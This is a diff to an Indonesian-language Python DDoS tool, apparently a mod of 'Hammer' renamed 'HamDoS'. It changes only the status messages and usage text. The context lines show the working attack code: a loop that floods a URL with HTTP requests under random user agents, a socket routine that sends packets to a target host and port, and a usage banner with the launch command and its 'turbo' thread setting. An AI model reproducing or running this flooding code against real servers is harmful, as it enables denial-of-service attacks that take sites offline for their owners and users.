@@ -35,7 +35,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mBot Mengunakan Hammer Mod HAHAHAHA...\033[0m")
+			print("\033[94mHamDDoS Istirahat...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -49,7 +49,7 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--Tunggu Sampai DOWN --> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <<[HamDoS Sedang Menyerang ]>> \033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
@@ -76,16 +76,17 @@ def dos2():
 
 def usage():
 	os.system('clear')
-	print (''' \033[92m	Tools Ini Adalah Tools Yang Sudah
+	print (''' \033[92m	Tools Ini Adalah Hammer Mod ( HamDoS )
 	Di Mod Oleh Bl4ck_Dr460n dan Sudah 80% bahasa Indonesia
-	Jadi Tools Ini Hammer V2 Yang Sudah Di Modifikasi
+	Jadi Tools Ini Hammer Yang Sudah Di Modifikasi
 	
+	cara Menjalankan :
 	Ketik python3 DDOS.py -s -p 80 -t 135
 	
 	-h : bantuan
 	-s : IP target
-	-p : masukan port 80
-	-t : turbo adalah kecepatan upload paket , masukan 135 \033[0m''')
+	-p : default port 80
+	-t : default turbo 135 \033[0m''')
 	sys.exit()
 
 
@@ -134,7 +135,7 @@ if __name__ == '__main__':
 		usage()
 	get_parameters()
 	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
-	print("\033[94mTunggu Bossq...\033[0m")
+	print("\033[94m<(Mengecek Server)>\033[0m")
 	user_agent()
 	my_bots()
 	time.sleep(5)
